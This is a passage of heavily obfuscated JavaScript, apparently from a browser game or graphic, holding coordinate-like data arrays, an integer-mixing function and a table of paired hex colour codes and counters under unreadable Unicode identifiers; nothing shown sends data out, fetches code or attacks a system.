			[ⵠΔᐃ, ⵠ[348], 53, 93, 240, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 52, 93, 238, Δⵠᐃ],
			[ΔΔΔ, ⵠ[348], 53, 93, 241, 0],
			[ⵠⲆΔ, ⵠ[348], 52, 93, 242, Δⵠᐃ],
			[1, ⵠ[348], 52, 93, 243, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[348], 53, 93, 244, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], 53, 93, 246, 0],
			[Ⲇᐃⵠ, ⵠ[348], 53, 93, 245, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 52, 93, 247, Δⵠᐃ],
			[ᐃⲆᐃ, ⵠ[348], 53, 93, 248, ᐃΔΔ],
			[1, ⵠ[348], 52, 92, 235, Δⵠᐃ],
			[1, ⵠ[348], 52, 92, 245, 0],
			[Ⲇᐃⵠ, ⵠ[348], 52, 93, 249, 0],
			[1, ⵠ[348], 53, 93, 250, ΔΔⵠ],
			[1, ⵠ[348], 53, 93, 251, Δⵠᐃ],
			[1, ⵠ[348], 53, 93, 252, 0],
			[1, ⵠ[348], 53, 93, 254, 0],
			[1, ⵠ[348], 52, 93, 253, 0],
			[1, ⵠ[348], 52, 93, ⵠᐃᐃⵠⲆⵠⲆ, ⲆΔⵠ],
			[ⵠⲆΔ, ⵠ[348], 53, 93, 257, 0],
			[1, ⵠ[348], 53, 93, ΔᐃΔⵠΔⲆᐃ, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[348], 52, 93, 258, ⵠⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 259, ΔⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], 52, 93, 260, 0],
			[1, ⵠ[348], 53, 93, 263, ⵠⲆⲆ],
			[1, ⵠ[348], 53, 93, 264, 0],
			[1, ⵠ[348], 53, 93, 265, 0],
			[1, ⵠ[348], 52, 93, 266, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[348], 53, 93, 267, 0],
			[1, ⵠ[348], 52, 93, 268, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 52, 93, 269, 0],
			[ᐃⲆᐃ, ⵠ[348], 53, 93, 276, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 277, 0],
			[1, ⵠ[348], 52, 93, 278, 0],
			[1, ⵠ[348], 53, 93, 279, 0],
			[1, ⵠ[348], 52, 93, 280, ᐃΔΔ],
			[1, ⵠ[348], 52, 93, 283, Δⵠᐃ],
			[ΔⲆⵠ, ⵠ[348], 53, 93, 284, ⵠⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], 53, 93, 285, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 53, 93, 286, ᐃΔΔ],
			[ΔⲆⵠ, ⵠ[348], 52, 93, 287, 0],
			[ΔⲆⵠ, ⵠ[348], 53, 93, 288, ΔΔⵠ],
			[1, ⵠ[348], 53, 93, 289, ᐃΔΔ],
			[1, ⵠ[348], 52, 93, 290, ⲆΔⵠ],
			[1, ⵠ[348], 52, 93, 291, 0],
			[1, ⵠ[348], 53, 93, 292, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[348], 52, 93, 293, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[348], 53, 93, 294, 0],
			[ⵠΔᐃ, ⵠ[348], 52, 93, 295, 0],
			[1, ⵠ[348], 52, 93, 296, Δⵠᐃ],
			[ⵠΔΔ, ⵠ[348], 53, 93, 297, 0],
			[ᐃⲆᐃ, ⵠ[348], 53, 93, 298, 0],
			[ᐃⲆᐃ, ⵠ[348], 52, 93, 299, ᐃⵠⲆ],
			[1, ⵠ[348], 53, 93, 300, 0],
			[ⵠΔᐃ, ⵠ[348], 52, 92, 298, 0],
			[1, ⵠ[348], 52, 92, 293, ᐃⵠⲆ],
			[ⵠⲆΔ, "r", 92, 262, 0],
			[1, "r", 93, 262, ⵠⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 52, 93, 261, 0],
			[1, ⵠ[568], 0, 223, 104, ᐃᐃⵠ],
			[ⵠΔΔ, ⵠ[568], 2, 223, 105, 1],
			[ΔΔΔ, ⵠ[568], 2, 223, 102, 1],
			[1, ⵠ[568], 2, 223, 103, ⵠΔᐃ],
			[ⵠΔΔ, ⵠ[156], ᐃᐃⲆⲆ, 141, Δᐃⵠⵠⵠ, 1],
			[ⵠΔΔ, ⵠ[568], ᐃⲆΔⲆ, 140, 9, ΔΔΔ],
			[1, ⵠ[156], 4, 142, ⵠᐃΔⵠΔ, 1],
			[1, ⵠ[348], 4, 81, 149, 0],
			[1, "f", ΔΔⵠ, 83, 148, 1],
			[ΔΔΔ, "f", ΔⲆⵠ, 82, 149, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[348], 34, 81, 156, 0],
			[ⵠⲆΔ, ⵠ[348], 51, ⲆΔⲆᐃΔΔⲆ, 9, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 54, ⵠΔⵠΔΔ, ⲆΔⵠᐃΔ, 0],
			[1, ⵠ[348], 54, ΔⲆᐃᐃⲆ, ⲆΔⵠᐃΔ, ⲆΔⵠ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆΔⵠ, 223, 106, ΔΔΔ],
			[1, "p", ⲆΔⵠ, 119, 279, 1],
			[ⵠΔⲆ, "p", ⵠⲆⲆ, 109, 242, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠΔᐃ, 29, ΔΔΔΔΔ, 1],
			[1, ⵠ[568], 2, 30, 9, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 31, ΔⲆⵠΔⲆ, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], 2, 32, 9, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆⵠᐃ, 33, ΔΔⵠⲆⵠ, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 69, ΔⵠᐃᐃⲆ, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 71, ΔⲆⵠΔⲆ, ΔⲆⵠ],
			[ᐃᐃⵠ, ⵠ[568], 2, 70, 9, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃᐃⵠ, 72, 9, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 73, ᐃⵠᐃᐃⲆ, ⵠΔⲆ],
			[ᐃᐃⵠ, ⵠ[348], ⵠⵠΔⲆᐃ, 31, 10, 0],
			[Ⲇᐃⵠ, ⵠ[348], 10, 29, 10, 0],
			[1, ⵠ[348], 10, 44, ⲆⵠⲆⵠⲆ, 0],
			[1, ⵠ[348], 4, 87, ⵠⵠⲆΔΔ, 0],
			[ⵠΔΔ, ⵠ[348], ⲆᐃᐃΔ, 86, 10, ᐃΔΔ],
			[1, ⵠ[348], 5, 87, 9, 0],
			[1, ⵠ[348], ΔΔᐃⲆ, ⵠᐃᐃΔⲆ, 10, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], Ⲇⵠⵠⵠ, ᐃΔᐃⲆⲆ, ΔⵠⲆⵠᐃᐃΔ, 0],
			[1, ⵠ[348], 4, 16, ⵠⵠΔⲆᐃ, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[348], Ⲇᐃⵠᐃ, 17, 10, 0],
			[Ⲇᐃⵠ, ⵠ[568], 2, 146, ΔΔΔΔΔ, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 148, 9, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 150, Ⲇᐃⵠⵠⵠ, 1],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 153, ᐃⵠᐃᐃⲆ, ⵠΔΔ],
			[1, ⵠ[568], 2, 155, ΔⲆⵠΔⲆ, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], 1, 149, ⵠⲆⲆΔᐃ, ⵠΔⲆ],
			[ᐃᐃⵠ, ⵠ[568], 1, 154, ⲆΔⲆΔⵠ, 1],
			[1, ⵠ[568], ΔⲆΔᐃ, 147, ΔⵠᐃᐃⲆ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 3, 151, ⵠᐃΔⵠΔ, ⵠΔᐃ],
			[ᐃⲆᐃ, ⵠ[568], 3, 152, ⲆⵠⲆⲆⲆ, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 156, ΔΔΔΔΔ, 1],
			[1, ⵠ[568], 3, 157, 9, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[568], 3, 158, ⲆⵠⲆⲆⲆ, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 159, 9, ⵠΔᐃ],
			[ΔⲆⵠ, ⵠ[568], 3, 160, 9, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆΔⵠ, 161, ⲆΔⵠᐃΔ, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆⵠᐃ, 162, ⵠᐃΔⵠΔ, ΔΔΔ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 163, ⵠⲆⲆΔᐃ, 1],
			[1, ⵠ[568], ⵠⲆΔ, 164, ⵠᐃΔⵠΔ, ⵠΔⲆ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 165, ⵠᐃΔⵠΔ, 1],
			[ⵠⲆΔ, ⵠ[568], 3, 166, ⲆⵠⲆⲆⲆ, 1],
			[ⵠΔⲆ, ⵠ[568], 3, 168, 9, 1],
			[1, ⵠ[568], 3, 170, 9, 1],
			[ᐃⲆᐃ, ⵠ[568], 1, 169, 9, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], ΔⵠᐃⲆ, 167, 9, ⵠΔΔ],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠΔ, 171, ⵠᐃΔⵠΔ, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 173, 9, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 172, 9, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 174, ΔΔΔΔΔ, ΔⲆⵠ],
			[ΔΔΔ, ⵠ[568], ᐃᐃⵠ, 175, 9, ⵠΔⲆ],
			[ⵠΔΔ, ⵠ[568], ⲆΔⵠⵠ, 176, 9, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 178, ⵠᐃΔⵠΔ, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⵠ, 179, 9, 1],
			[ⵠΔⲆ, ⵠ[568], ⲆΔⵠ, 180, Ⲇᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], 2, 177, 9, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 182, ΔⲆⵠΔⲆ, ⵠΔⲆ],
			[1, ⵠ[568], 2, 181, 9, 1],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 183, ΔⵠᐃᐃⲆ, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆΔⲆ, 184, Ⲇᐃⵠⵠⵠ, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 185, 9, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 186, 9, 1],
			[ᐃᐃⵠ, ⵠ[568], 1, 187, 9, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 188, 9, ⵠΔᐃ],
			[ΔΔΔ, ⵠ[568], ⲆᐃΔᐃ, 189, 9, 1],
			[ΔⲆⵠ, ⵠ[568], 3, 190, ΔΔΔΔΔ, Ⲇᐃⵠ],
			[1, ⵠ[568], 3, 191, ⵠᐃΔⵠΔ, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], 2, 192, ⵠⲆⲆΔᐃ, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 193, ΔⵠᐃᐃⲆ, 1],
			[1, ⵠ[568], 2, 194, ⲆⵠⲆⲆⲆ, 1],
			[ⵠΔΔ, ⵠ[568], 2, 196, ⵠⲆⲆΔᐃ, ᐃᐃⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 198, 9, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 200, 9, ⵠΔᐃ],
			[1, ⵠ[568], ⲆᐃΔᐃ, 195, 9, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ⲆᐃΔᐃ, 197, ⵠᐃΔⵠΔ, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 199, 9, 1],
			[ᐃᐃⵠ, ⵠ[568], ⲆΔⵠ, 201, 9, 1],
			[ΔⲆⵠ, ⵠ[568], ΔⵠᐃⲆ, 202, 9, 1],
			[1, ⵠ[568], 2, 203, 9, 1],
			[ΔΔΔ, ⵠ[568], ΔⲆᐃⲆ, 208, 9, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 207, ⲆⵠⲆⲆⲆ, 1],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 206, ΔΔΔΔΔ, ᐃᐃⵠ],
			[ⵠΔΔ, ⵠ[568], ⲆΔⵠⵠ, 205, 9, ⵠΔΔ],
			[1, ⵠ[568], 3, 204, 9, ΔΔΔ],
			[1, ⵠ[568], 3, 214, ΔΔⵠⲆⵠ, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], ⲆΔⵠⵠ, 215, ⲆΔⲆΔⵠ, ⵠⲆΔ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆΔⵠ, 216, 9, ⵠΔᐃ],
			[1, ⵠ[568], 3, 217, ΔⲆⵠΔⲆ, ⵠΔᐃ],
			[1, ⵠ[568], 3, 218, ⲆΔⲆΔⵠ, Ⲇᐃⵠ],
			[1, "b", ⲆΔⵠ, 5, 159, ᐃⵠΔ],
			[ⵠΔΔ, "b", 0, ΔΔᐃⲆ, 171, 0],
			[2, ⵠ[424], 1, 122, 63, 0],
			[2, ⵠ[424], ᐃⲆΔⲆ, 119, 277, 0],
			[ⵠⵠⵠΔ, ⵠ[424], ᐃⲆⵠᐃ, 109, 244, ᐃⵠΔ],
			[ⵠⵠΔⲆ, ⵠ[424], ⵠⵠΔⲆ, 114, 205, ᐃⵠⲆ],
			[ⲆᐃᐃⲆ, ⵠ[424], Ⲇᐃⵠ, 120, 150, 0],
			[ⲆᐃᐃⲆ, ⵠ[424], ⲆⲆΔᐃ, 154, 129, ᐃΔΔ],
			[2, ⵠ[424], 0, 184, 158, 0],
			[2, ⵠ[424], ⵠΔᐃ, 208, 128, 0],
			[ⲆᐃᐃⲆ, ⵠ[424], 1, 215, 132, 0],
			[2, ⵠ[424], ΔΔΔ, 214, 128, ᐃⵠΔ],
			[2, ⵠ[424], ΔⲆⵠ, 209, 132, ΔⲆⲆ],
			[1, ⵠ[156], 3, 217, ⵠⵠⵠⲆᐃ, ⵠⲆΔ],
			[1, ⵠ[156], 1, 215, ΔΔⲆᐃⵠ, Ⲇᐃⵠ],
			[1, ⵠ[156], 0, 212, 18, ⵠΔᐃ],
			[1, ⵠ[156], ⲆⵠΔⵠ, 214, ⲆᐃΔⵠΔ, 1],
			[ⵠΔⲆ, ⵠ[156], 4, 216, 19, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[156], 4, 211, ᐃΔⲆⵠᐃ, 1],
			[ⵠⲆΔ, ⵠ[156], 3, 210, 19, Ⲇᐃⵠ],
			[1, ⵠ[156], ΔⲆΔᐃ, 215, 21, ΔⲆⵠ],
			[ΔΔΔ, ⵠ[156], ⵠΔΔ, 214, 20, 1],
			[ΔⲆⵠ, ⵠ[156], 3, 214, 22, ⵠΔΔ],
			[ⵠΔΔ, ⵠ[156], ΔⲆΔᐃ, 214, 24, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[156], 4, 214, 26, 1],
			[ⵠⲆΔ, ⵠ[156], 4, 213, 27, 1],
			[1, ⵠ[156], ᐃᐃⵠ, 212, 28, ⵠΔΔ],
			[1, ⵠ[156], ΔⵠᐃⲆ, 212, 29, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[156], ⲆΔΔᐃ, 212, 30, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[156], 4, 208, ᐃⲆᐃⵠⵠ, ⵠΔΔ],
			[1, ⵠ[156], ⲆᐃᐃΔ, 207, 19, ᐃⲆᐃ],
			[1, ⵠ[156], 1, 206, 19, 1],
			[ⵠΔⲆ, ⵠ[156], ⵠΔⲆ, 205, 19, 1],
			[1, ⵠ[156], 2, 204, ΔΔΔΔⲆ, 1],
			[1, ⵠ[156], ᐃΔΔⲆ, 203, 19, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[156], 3, 210, ⲆⵠᐃΔᐃ, ⵠΔΔ]
		];

		function ⵠⲆⲆⲆⵠΔⲆ(ΔⵠᐃⵠΔᐃᐃ, ⵠⲆᐃᐃⵠΔΔ, ⲆᐃⲆⵠⲆ, ΔΔⵠⲆᐃⵠⲆ, ⲆⵠΔΔⲆΔⲆ, ⲆΔᐃⵠⲆⲆⵠ) {
			const ΔΔⲆⵠⲆΔⵠ = ~(21830 & ΔⵠᐃⵠΔᐃᐃ) & (ΔⵠᐃⵠΔᐃᐃ | 21830);
			const ΔΔⲆⲆᐃΔΔ = 42702 ^ ⵠⲆᐃᐃⵠΔΔ;
			const ⲆⲆⲆⲆΔⵠⲆ = (16 << (ⲆᐃⲆⵠⲆ >> 8 & 255)) + (0 << (ⲆᐃⲆⵠⲆ >> 0 & 255)) + (8 << (ⲆᐃⲆⵠⲆ >> 24 & 255)) + (24 << (ⲆᐃⲆⵠⲆ >> 16 & 255));
			const ΔⵠⵠⵠΔᐃⲆ = ΔΔⵠⲆᐃⵠⲆ ^ 15851;
			const ΔⲆⵠᐃΔᐃΔ = ~(31920 & ⲆⵠΔΔⲆΔⲆ) & ⲆⵠΔΔⲆΔⲆ | ~(ⲆⵠΔΔⲆΔⲆ & 31920) & 31920;
			const ⵠᐃΔⵠΔΔΔ = (1013904223 + (31467 + ⲆΔᐃⵠⲆⲆⵠ) * 1664525) % 4294967296;
			const ΔᐃΔΔᐃⲆᐃ = ΔⵠΔᐃⲆⵠⲆ(ΔΔⲆⵠⲆΔⵠ, ΔΔⲆⲆᐃΔΔ, ⲆⲆⲆⲆΔⵠⲆ, ΔⵠⵠⵠΔᐃⲆ, ΔⲆⵠᐃΔᐃΔ);
			const ΔΔᐃⵠⲆⵠⲆ = ᐃⲆᐃⵠⲆⵠᐃ(ⵠᐃΔⵠΔΔΔ, ΔΔⲆⵠⲆΔⵠ);
			const ᐃΔΔⲆⵠΔⵠ = (12345 + (35488 + (ΔᐃΔΔᐃⲆᐃ ^ ΔΔᐃⵠⲆⵠⲆ)) * 1103515245) % 2147483648;
			return ᐃΔΔⲆⵠΔⵠ
		}
		var ᐃⲆ = ᐃΔΔ;
		let Ⲇ = {
			"ⲆⵠΔⲆᐃ": ["#133A2B", ⵠ[331]],
			"ᐃⵠΔⲆⲆᐃΔΔⲆ": [ⵠ[560], ⵠ[112]],
			"ⲆΔⵠⲆᐃΔⵠ": ["#4EB687", ⵠ[272]],
			"ᐃᐃᐃⲆΔⲆⲆ": ["#664516", "#13474C"],
			"ⲆΔⵠⵠᐃᐃⵠ": ["#FCEFBB", "#0F4D48"],
			"ⵠᐃⵠⲆᐃⲆᐃ": ["#C1AA7E", "#0F423D"],
			"ⵠⲆᐃⵠⵠΔⲆ": ["#594837", ⵠ[245]],
			"ⵠⵠᐃⲆΔⵠⵠ": ["#A5D6D6", "#539CA0"],
			"ⵠⵠᐃⵠⵠ": [ⵠ[124], ⵠ[283]],
			"ⵠⲆΔΔᐃⵠⲆ": [ⵠ[303], ⵠ[97]],
			"ᐃⵠⵠⵠΔΔⵠ": [ⵠ[122], ⵠ[61]],
			"ⵠΔᐃᐃᐃᐃΔ": ["#ECF7F9", "#539CA0"],
			"ΔᐃⵠⲆⲆᐃⵠ": [ⵠ[253], ⵠ[253]],
			"ⵠⵠⵠⵠⲆⵠΔ": [ⵠ[253], ⵠ[253]],
			"ᐃΔᐃⲆΔⲆᐃ": ["#1C9BA4", "#00272F"],
			"ⲆᐃⵠΔⵠ": ["#2D2017", "#031C1E"],
			"ⲆⵠΔ": 0,
			"ΔⲆΔ": ΔⲆⵠ,
			"ⵠΔΔᐃᐃᐃⵠⵠΔ": 2300,
			"ΔⲆᐃΔᐃⵠⲆⵠᐃ": 2290,
			"ⵠΔⵠⵠⲆⵠⲆ": 34,
			"ᐃⲆⵠⲆⲆΔᐃ": 5,
			"ΔᐃᐃΔᐃᐃᐃ": 68,
			"ΔⲆΔⵠⲆⵠΔ": 34,
			"ⲆΔΔᐃᐃΔⲆ": ᐃΔΔΔ,
			"ᐃΔᐃⲆᐃΔᐃ": Ⲇᐃⵠ,
			"ΔΔΔⲆⵠᐃⲆ": .6,
			"ΔⲆⲆᐃᐃⵠΔ": .25,
			"ⲆᐃⲆⲆᐃΔΔ": 50,
			"ⵠᐃⲆᐃΔᐃⲆ": 10,
			"ⵠⵠⵠᐃⵠⲆⲆ": 75,
			"ᐃΔⵠᐃΔᐃⵠ": ⵠΔΔⲆⲆ,
			"ΔⲆᐃᐃΔⵠⲆ": ⲆΔΔᐃ,
			"ⲆᐃⵠΔᐃ": ᐃⲆ++,
			"ⲆⵠᐃⵠΔ": ᐃⲆ++,
			"ⲆᐃⵠⲆᐃ": ᐃⲆ++,
			"ΔΔⲆⵠⲆ": ᐃⲆ++,
			"ⵠⲆⲆΔⲆ": ᐃⲆ++,
			"ⵠᐃⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⵠᐃⵠ": ᐃⲆ++,
			"ᐃⲆᐃΔᐃ": ᐃⲆ++,
			"ΔᐃⲆΔⲆ": ᐃⲆ++,
			"ⲆᐃⲆⲆΔ": ᐃⲆ++,
			"ΔⵠᐃⲆⵠ": ᐃⲆ++,
			"ᐃᐃⲆⵠᐃ": ᐃⲆ++,
			"ⲆⲆⵠΔⲆ": ᐃⲆ++,
			"ΔⵠΔΔⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔⲆ": ᐃⲆ++,
			"ΔᐃΔΔΔ": ᐃⲆ++,
			"ⲆⲆⵠᐃⵠ": ᐃⲆ++,
			"ΔⲆⲆΔᐃ": ᐃⲆ++,
			"ᐃᐃΔⲆΔ": ᐃⲆ++,
			"ⲆⵠⵠᐃΔ": ᐃⲆ++,
			"ᐃⵠᐃⲆⲆ": ᐃⲆ++,
			"ᐃᐃΔΔΔ": ᐃⲆ++,
			"ΔⵠⲆΔᐃ": ᐃⲆ++,
			"ΔⵠⲆⵠΔ": ᐃⲆ++,
			"ᐃⵠΔⲆᐃ": ᐃⲆ++,
			"ⵠΔΔᐃⲆ": ᐃⲆ++,
			"ⲆⵠⲆⵠΔ": ᐃⲆ++,
			"ᐃΔⲆⲆⲆ": ᐃⲆ++,
			"ⵠⵠⲆⵠⲆ": ᐃⲆ++,
			"ⵠᐃᐃⵠ": ᐃⲆ++,
			"ⵠⵠᐃⲆⲆ": ᐃⲆ++,
			"ⵠⲆⵠΔᐃ": ᐃⲆ++,
			"ⵠⲆᐃΔⲆ": ᐃⲆ++,
			"ⲆⲆΔᐃΔ": ᐃⲆ++,
			"ΔⵠⲆⲆᐃ": ᐃⲆ++,
			"ΔⵠⲆΔⲆ": ᐃⲆ++,
			"ⲆᐃⵠΔⲆ": ᐃⲆ++,
			"ᐃᐃᐃⲆⵠ": ᐃⲆ++,
			"ⲆⵠⵠⲆⵠ": ᐃⲆ++,
			"ΔΔΔⵠΔ": ᐃⲆ++,
			"ⲆⵠΔᐃⲆ": ᐃⲆ++,
			"ΔⵠᐃⲆⲆ": ᐃⲆ++,
			"ΔⲆΔⵠⵠ": ᐃⲆ++,
			"ⲆⵠΔⲆΔ": ᐃⲆ++,
			"ⵠⵠⲆⲆᐃ": ᐃⲆ++,
			"ᐃⵠⵠⵠᐃ": ᐃⲆ++,
			"ΔⵠⵠΔᐃ": ᐃⲆ++,
			"ΔⵠᐃΔⲆ": ᐃⲆ++,
			"ᐃⲆΔΔⵠ": ᐃⲆ++,
			"ⵠⲆⲆⵠⵠ": ᐃⲆ++,
			"ΔΔⲆⵠΔ": ᐃⲆ++,
			"ⵠᐃΔΔᐃ": ᐃⲆ++,
			"ⵠᐃᐃⲆΔ": ᐃⲆ++,
			"ᐃΔⲆᐃᐃ": ᐃⲆ++,
			"ⵠΔᐃⵠΔ": ᐃⲆ++,
			"ΔΔᐃⲆΔ": ᐃⲆ++,
			"ΔΔⵠᐃⵠ": ᐃⲆ++,
			"ΔΔⵠᐃᐃ": ᐃⲆ++,
			"ᐃⵠⵠⲆΔ": ᐃⲆ++,
			"ⵠᐃⲆⲆⵠ": ᐃⲆ++,
			"ⵠⵠᐃⵠΔ": ᐃⲆ++,
			"ΔⲆⲆⲆⲆ": ᐃⲆ++,
			"ᐃⲆⲆᐃⲆ": ᐃⲆ++,
			"ⵠⲆⵠⲆᐃ": ᐃⲆ++,
			"ⵠᐃΔⲆⵠ": ᐃⲆ++,
			"ᐃΔⲆᐃΔ": ᐃⲆ++,
			"ᐃⲆⵠⲆⵠ": ᐃⲆ++,
			"ᐃⵠΔⵠΔ": ᐃⲆ++,
			"ⲆⲆᐃᐃΔ": ᐃⲆ++,
			"ⵠΔΔⵠⵠ": ᐃⲆ++,
			"ᐃᐃΔⵠᐃ": ᐃⲆ++,
			"ⵠⲆⲆⲆΔ": ᐃⲆ++,
			"ΔᐃⵠΔⲆ": ᐃⲆ++,
			"ⲆΔⲆⵠⵠ": ᐃⲆ++,
			"ⲆᐃⵠᐃⲆ": ᐃⲆ++,
			"ⲆⵠⵠΔᐃ": ᐃⲆ++,
			"ᐃᐃᐃⵠΔ": ᐃⲆ++,
			"Ⲇⵠᐃⵠⵠ": ᐃⲆ++,
			"ᐃΔⵠⲆⲆ": ᐃⲆ++,
			"ΔᐃᐃΔΔ": ᐃⲆ++,
			"ⲆⲆΔᐃᐃ": ᐃⲆ++,
			"ⲆⲆⵠᐃᐃ": ᐃⲆ++,
			"ⵠⲆⵠΔⵠ": ᐃⲆ++,
			"ⲆⵠᐃΔΔ": ᐃⲆ++,
			"ⲆⲆΔⲆᐃ": ᐃⲆ++,
			"ΔᐃᐃΔᐃ": ᐃⲆ++,
			"ᐃΔⲆᐃⲆ": ᐃⲆ++,
			"ⲆᐃⲆᐃⲆ": ᐃⲆ++,
			"ΔᐃⲆⵠΔ": ᐃⲆ++,
			"ⲆⵠΔⲆⲆ": ᐃⲆ++,
			"ⲆᐃⲆΔⵠ": ᐃⲆ++,
			"ⲆᐃᐃⵠⲆ": ᐃⲆ++,
			"ⵠΔⲆⵠΔ": ᐃⲆ++,
			"ΔⵠᐃⵠⲆ": ᐃⲆ++,
			"ⲆᐃⵠⵠΔ": ᐃⲆ++,
			"ⲆΔΔⵠⵠ": ᐃⲆ++,
			"ⵠΔⲆΔΔ": ᐃⲆ++,
			"ⵠⲆᐃⵠᐃ": ᐃⲆ++,
			"ΔΔⵠⵠⲆ": ᐃⲆ++,
			"ΔⲆᐃⵠⲆ": ᐃⲆ++,
			"ⲆⲆΔΔᐃⲆⵠΔⵠ": ᐃⲆ++,
			"ΔᐃΔΔᐃ": ᐃⲆ++,
			"ⲆΔᐃⲆⵠ": ᐃⲆ++,
			"ΔⵠⲆⲆⲆ": ᐃⲆ++,
			"ⵠᐃᐃΔⵠ": ᐃⲆ++,
			"ᐃⵠⵠΔⲆ": ᐃⲆ++,
			"ⲆⵠⲆΔᐃ": ᐃⲆ++,
			"ᐃⵠⲆⵠⵠ": ᐃⲆ++,
			"ᐃⵠⲆⵠᐃ": ᐃⲆ++,
			"ⲆΔΔΔ": ᐃⲆ++,
			"ⵠⲆΔⲆⲆ": ᐃⲆ++,
			"ΔⲆⵠⵠ": ᐃⲆ++,
			"ΔⲆᐃΔ": ᐃⲆ++,
			"ⵠΔᐃᐃΔᐃⵠ": ᐃⲆ++,
			"ᐃⲆⲆΔᐃ": ᐃⲆ++,
			"ΔⵠᐃΔᐃⵠⲆ": ᐃⲆ++,
			"ⵠⲆᐃⲆⵠ": ᐃⲆ++,
			"ⲆᐃⲆⲆⲆ": ᐃⲆ++,
			"ᐃΔᐃⵠⵠᐃᐃ": ᐃⲆ++,
			"ⵠΔⵠΔⲆΔⲆ": ᐃⲆ++,
			"ⵠΔⵠΔⲆ": ᐃⲆ++,
			"ⲆⵠΔⲆ": ᐃⲆ++,
			"ᐃΔᐃΔⵠ": ᐃⲆ++,
			"ΔⲆⵠⵠᐃ": ᐃⲆ++,
			"ⲆᐃᐃΔⲆᐃΔ": ᐃⲆ++,
			"ΔⲆΔⲆᐃ": ᐃⲆ++,
			"ΔⲆⲆΔⵠ": ᐃⲆ++,
			"ⵠⲆᐃᐃᐃ": ᐃⲆ++,
			"ᐃᐃⲆⲆᐃ": ᐃⲆ++,
			"ᐃⲆᐃⲆᐃ": ᐃⲆ++,
			"ⵠᐃⲆᐃⵠ": ᐃⲆ++,
			"ⵠᐃⲆⵠᐃ": ᐃⲆ++,
			"ⲆⵠⲆΔⲆ": ᐃⲆ++,
			"ΔⵠⲆᐃᐃ": ᐃⲆ++,
			"ⵠⲆⲆⲆⵠ": ᐃⲆ++,
			"ΔΔⲆᐃᐃ": ᐃⲆ++,
			"ⲆΔΔⲆᐃ": ᐃⲆ++,
			"ᐃΔΔΔΔ": ᐃⲆ++,
			"Ⲇⵠᐃᐃⵠ": ᐃⲆ++,
			"ⲆⲆⲆᐃᐃ": ᐃⲆ++,
			"ΔΔⵠⵠᐃΔⲆ": ᐃⲆ++,
			"ⵠᐃΔⲆⲆ": ᐃⲆ++,
			"ΔᐃⲆⲆⲆⲆⲆ": ᐃⲆ++,
